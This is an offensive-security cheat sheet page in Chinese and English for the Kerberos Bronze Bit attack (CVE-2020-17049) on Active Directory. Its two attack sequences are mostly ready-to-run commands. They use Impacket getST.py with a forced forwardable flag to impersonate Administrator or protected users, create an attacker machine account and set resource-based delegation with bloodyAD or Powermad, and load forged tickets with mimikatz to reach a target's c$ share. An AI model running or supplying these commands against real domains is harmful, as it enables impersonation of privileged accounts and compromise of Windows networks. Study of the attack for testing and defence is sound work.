# Kerberos - Bronze Bit

CVE-2020-17049

> 攻击者可以模拟不被允许委派的用户。这包括 **Protected Users** (受保护用户) 组的成员以及其他任何显式配置为 **敏感且无法委派** (sensitive and cannot be delegated) 的用户。
> 该补丁于 2020 年 11 月 10 日发布，域控制器 (DC) 在 [2021年2月](https://support.microsoft.com/en-us/help/4598347/managing-deployment-of-kerberos-s4u-changes-for-cve-2020-17049) 之前很可能受到此漏洞的影响。

:warning: 修复后的错误消息 (Patched Error Message) : `[-] Kerberos SessionError: KRB_AP_ERR_MODIFIED(Message stream modified)`

**要求 (Requirements)**:

* 服务帐户的密码哈希 (Service account's password hash)
* 具有 `约束委派` (Constrained Delegation) 或 `基于资源的约束委派` (Resource Based Constrained Delegation) 的服务帐户
* [Impacket PR #1013](https://github.com/SecureAuthCorp/impacket/pull/1013)

**攻击 #1 (Attack #1)** - 绕过 `仅信任此用户委派指定的服务 – 仅使用 Kerberos` (Trust this user for delegation to specified services only – Use Kerberos only) 的保护，并模拟受到委派保护的用户。

```powershell
# forwardable (可转发) 标志仅受使用服务帐户密码的票据加密保护
$ getST.py -spn cifs/Service2.test.local -impersonate Administrator -hashes <LM:NTLM hash> -aesKey <AES hash> test.local/Service1 -force-forwardable -dc-ip <Domain controller> # -> Forwardable

$ getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes aad3b435b51404eeaad3b435b51404ee:7c1673f58e7794c77dead3174b58b68f -aesKey 4ffe0c458ef7196e4991229b0e1c4a11129282afb117b02dc2f38f0312fc84b4 test.local/Service1 -force-forwardable

# 加载票据 (Load the ticket)
.\mimikatz\mimikatz.exe "kerberos::ptc User2.ccache" exit

# 访问 "c$" (Access "c$")
ls \\service2.test.local\c$
```

**攻击 #2 (Attack #2)** - 对 AD 中一个或多个对象的写入权限 (Write Permissions to one or more objects in the AD)

* Windows/Linux:

    ```ps1
    bloodyAD -u user -p 'totoTOTOtoto1234*' -d test.local --host 10.100.10.5 add computer AttackerService 'AttackerServicePassword'
    bloodyAD --host 10.1.0.4 -u user -p 'totoTOTOtoto1234*' -d test.local add rbcd 'Service2$' 'AttackerService$'

    # 执行攻击 (Execute the attack)
    getST.py -spn cifs/Service2.test.local -impersonate User2 -dc-ip 10.100.10.5 -force-forwardable 'test.local/AttackerService$:AttackerServicePassword'
    ```

* 仅限 Windows (Windows only):

    ```powershell
    # 创建一个新的机器帐户 (Create a new machine account)
    Import-Module .\Powermad\powermad.ps1
    New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString 'AttackerServicePassword' -AsPlainText -Force)
    .\mimikatz\mimikatz.exe "kerberos::hash /password:AttackerServicePassword /user:AttackerService /domain:test.local" exit

    # 设置 PrincipalsAllowedToDelegateToAccount
    Install-WindowsFeature RSAT-AD-PowerShell
    Import-Module ActiveDirectory
    Get-ADComputer AttackerService
    Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$
    Get-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount

    # 执行攻击 (Execute the attack)
    python .\impacket\examples\getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc test.local/AttackerService -force-forwardable

    # 加载票据 (Load the ticket)
    .\mimikatz\mimikatz.exe "kerberos::ptc User2.ccache" exit | Out-Null
    ```

## 参考资料 (References)

* [CVE-2020-17049: Kerberos Bronze Bit Attack – Practical Exploitation - Jake Karnes - December 8th, 2020](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/)
* [CVE-2020-17049: Kerberos Bronze Bit Attack – Theory - Jake Karnes - December 8th, 2020](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/)
* [Kerberos Bronze Bit Attack (CVE-2020-17049) Scenarios to Potentially Compromise Active Directory](https://www.hub.trimarcsecurity.com/post/leveraging-the-kerberos-bronze-bit-attack-cve-2020-17049-scenarios-to-compromise-active-directory)
